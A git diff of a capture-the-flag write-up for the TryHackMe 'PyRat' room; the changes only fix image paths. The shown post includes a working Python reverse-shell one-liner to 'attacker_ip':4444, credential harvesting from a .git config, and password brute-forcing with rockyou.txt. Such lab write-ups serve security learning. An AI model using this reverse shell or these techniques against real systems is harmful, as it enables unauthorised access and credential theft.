@@ -8,13 +8,13 @@ description: Crafting custom payloads, enumerating for passwords, restoring Git 
 
 # PyRat
 
-![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/1.png)
+![](/assets/img/post/thm_pyrat/1.png)
 
 ## Reconnaissance
 
 Let's fire up our favorite network scanning tool and see what services we have online.
 
-![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/2.png)
+![](/assets/img/post/thm_pyrat/2.png)
 
 This very interesting machine has a custom service on port 8000 which Nmap couldn't identify. Although the service looks like a web server, if we try accessing it with Curl we receive a curious message back:
 
@@ -54,19 +54,19 @@ Using a simple reverse shell payload for Python we get our initial shell access.
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
 ```
 
-![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/4.png)
+![](/assets/img/post/thm_pyrat/4.png)
 
 Now can explore further the machine and find our way to the root user calmly, that being said, time for some enumeration. I often sudo binaries, permissions and processes, and this time, I've found a really interesting process running in background:
 
-![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/5.png)
+![](/assets/img/post/thm_pyrat/5.png)
 
 The `pyrat.py` is being executed as root, funny eh? Moreover, we have an interesting directory inside `/opt` folder:
 
-![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/6.png)
+![](/assets/img/post/thm_pyrat/6.png)
 
 The `.git` folder indicates us this folder is most likely a repository, notice the owner user is `think`. Since I don't a have a fully functional terminal I'll check the folder manually for credentials, as developers often save the credentials to avoid inserting them very time a commit is created.
 
-![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/7.png)
+![](/assets/img/post/thm_pyrat/7.png)
 
 
 
@@ -74,7 +74,7 @@ The `.git` folder indicates us this folder is most likely a repository, notice t
 
 The `config` file has some credentials for the user `think` and also an email address related to the project. The credentials can be used to access the user through SSH and get our first flag inside the home directory:
 
-![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/8.png)
+![](/assets/img/post/thm_pyrat/8.png)
 
 We can also check the repository for previous commits and check what were the developers working on:
 
@@ -162,11 +162,11 @@ Hello jose, I wanted to tell you that i have installed the RAT you posted on you
 
 Our current user has received an email from the root user, informing root has installed a RAT inside their own system for testing purposes, and that the RAT have been posted on [Github](https://github.com/josemlwdf/PyRAT). So I've decided to check it out since we have the author's email and name.
 
-![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/9.png)
+![](/assets/img/post/thm_pyrat/9.png)
 
 Reading through the project, there is some key information to solving this challenge: the RAT often uses port 8000, and also has some special commands to access admin shell.
 
-![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/10.png)
+![](/assets/img/post/thm_pyrat/10.png)
 
 So we've been messing with PyRAT so far, and we know the endpoint meant earlier is admin. Problem is that it requires a password and we don't have it, so I've decided to bruteforce it. Had to create a custom Python script to do so:
 
@@ -227,10 +227,10 @@ if __name__ == "__main__":
 
 This script connects to the server and bruteforces it using a wordlist provided by the user. After reading some code from the repository, I've found the program gives you 3 chances to guess to correct password, and you must reopen the connection if you guess all 3 wrong. So every time we connect, we try 2 passwords before resetting the connection. Doesn't take too long to find the correct password.
 
-![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/11.png)
+![](/assets/img/post/thm_pyrat/11.png)
 
 I've used **rockyou.txt** wordlist for this purpose since it's commonly used in CTF challenges. Now we login as admin through the rootkit and get the final flag:
 
-![](/home/rebellion/blog/jlowborn.github.io/assets/img/post/thm_pyrat/12.png)
+![](/assets/img/post/thm_pyrat/12.png)
 
 That's it! Thanks for reading!
